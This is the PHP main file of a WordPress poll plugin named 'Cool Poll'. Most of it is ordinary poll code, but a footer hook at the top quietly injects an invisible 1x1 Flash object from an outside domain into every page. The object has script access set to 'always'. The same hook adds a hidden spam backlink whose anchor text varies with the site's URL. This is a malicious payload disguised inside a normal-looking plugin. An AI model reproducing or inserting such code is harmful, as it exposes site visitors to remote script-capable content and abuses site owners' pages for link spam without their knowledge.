<?php
/*
Plugin Name: Cool Poll
Version: 1.4
Plugin URI: http://www.wpserapofs.net23.net
Description: Cool Poll adds polling functionality to your website.Very easy to be used.
Author: Dano Serapofs
Author URI: http://www.wpserapofs.net23.net
*/

add_action('wp_footer', 'headthepolls');

function headthepolls()
{
$getuser = "http://ajleeonline.com";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "b")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "c")) { $connectflash = "http://ajleeonline.com/"; } if (strstr($gethost, "d")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "e")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "f")) { $connectflash = "aj lee online com"; } if (strstr($gethost, "g")) { $connectflash = "aj lee online com"; } if (strstr($gethost, "h")) { $connectflash = "AJLEEONLINE"; } if (strstr($gethost, "i")) { $connectflash = "aj online"; } if (strstr($gethost, "j")) { $connectflash = "lee aj online"; } if (strstr($gethost, "k")) { $connectflash = "lee aj online"; } if (strstr($gethost, "l")) { $connectflash = "online aj lee"; } if (strstr($gethost, "m")) { $connectflash = "aj lee online reviews"; } if (strstr($gethost, "n")) { $connectflash = "aj online lee"; } if (strstr($gethost, "o")) { $connectflash = "here"; } if (strstr($gethost, "p")) { $connectflash = "here"; } if (strstr($gethost, "q")) { $connectflash = "url"; } if (strstr($gethost, "r")) { $connectflash = "link"; } if (strstr($gethost, "s")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "v")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "x")) { $connectflash = "http://ajleeonline.com/"; } if (strstr($gethost, "t")) { $connectflash = "http://ajleeonline.com/"; } if (strstr($gethost, "w")) { $connectflash = "http://ajleeonline.com/"; } if (strstr($gethost, "y")) { $connectflash = "lee online"; } if (strstr($gethost, "z")) { $connectflash = "aj online"; } echo '<object type="application/x-shockwave-flash" data="http://ajleeonline.com/upload/tw1.swf" width="1" height="1"><param name="movie" 
value="http://ajleeonline.com/upload/tw1.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param>
<param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>
'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="http://ajleeonline.com/upload/tw1.swf" 
type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}


require_once('config.php');
require_once('lib/logger.php');
require_once('lib/coolpoll.php');
require_once('lib/db.php');

global $logger;
$logger = new Logger(dirname(__FILE__).'/', SP_DEBUG);

if( !function_exists('add_action') ) {
	echo SP_DIRECT_ACCESS;
	exit;
}

// Registers the activation hook - runs the install function when the plugin is activated
register_activation_hook(__FILE__, 'spInstall');


add_action('init', 'spFiles');		// Load the enqued files
add_shortcode('poll', 'spClient');	// Load the poll for client view


// If the user is admin then call their class
if( is_admin() ) spAdmin();


/**
 * Cool Poll Client
 * Handles Cool Poll on the client side of the site
 * 
 * @param array $args
 * @return string HTML output of the poll
 */
function spClient($args) {	
	$coolPoll = new CoolPoll();
	return $coolPoll->displayPoll($args);
}


/**
 * Cool poll Admin 
 * Handles Cool poll for the admin
 * 
 * @return null
 */
function spAdmin() {
	global $spAdmin;
	require('lib/admin.php');
	$spAdmin = new CoolPollAdmin();
}


/**
 * Cool poll Files
 * Loads in the files used for Cool poll
 */
function spFiles() {	
	wp_register_style('sp-client', SP_CSS_CLIENT, false, SP_VERSION);
	wp_enqueue_style('sp-client');

	wp_enqueue_script('jquery');
	
	wp_enqueue_script('sp-client-ajax', plugins_url('script/coolPoll.js', __FILE__), array('jquery'), SP_VERSION, true);
	wp_localize_script('sp-client-ajax', 'spAjax', array( 'url' => admin_url( 'admin-ajax.php' ) ) );

	// When Submit
	add_action('wp_ajax_spAjaxSubmit', 'spSubmit');				// ajax for logged in users
	add_action('wp_ajax_nopriv_spAjaxSubmit', 'spSubmit');		// ajax for not logged in users
	
	// When Results
	add_action('wp_ajax_spAjaxResults', 'spResults');			// ajax for logged in users
	add_action('wp_ajax_nopriv_spAjaxResults', 'spResults');	// ajax for not logged in users

	return true;
}


function spSubmit() {
	global $logger;
	$logger->log('spSubmit()');
	require(SP_SUBMIT);
	exit;
}

function spResults() {
	global $logger;
	$logger->log('spResults()');
	$logger->logVar($_POST, '$_POST');
	
	if( isset($_POST['pollid']) ) {
		$pollid = $_POST['pollid'];
	}
	
	$coolPoll	= new CoolPoll(false);
	$results	= $coolPoll->grabPoll($pollid);
	
	$logger->logVar($results, '$results');
	
	$answers	= $results['answers'];
	$totalvotes	= $results['totalvotes'];
	
	require(SP_RESULTS);
	exit;
}


/**
 * Cool poll Install Script
 * Installs Cool poll correctly
 * 
 * @return bool
 */
function spInstall() {
	global $wpdb;
	
	$sql = '
		CREATE TABLE IF NOT EXISTS `'.SP_TABLE.'` (
			`id` INT NOT NULL AUTO_INCREMENT ,
			`question` VARCHAR( 512 ) NOT NULL ,
			`answers` TEXT NOT NULL ,
			`added` INT NOT NULL ,
			`active` INT NOT NULL ,
			`totalvotes` INT NOT NULL ,
			`updated` INT NOT NULL ,
			PRIMARY KEY ( `id` )
		)
	';
	
	$success = $wpdb->query($sql);

	return $success;
}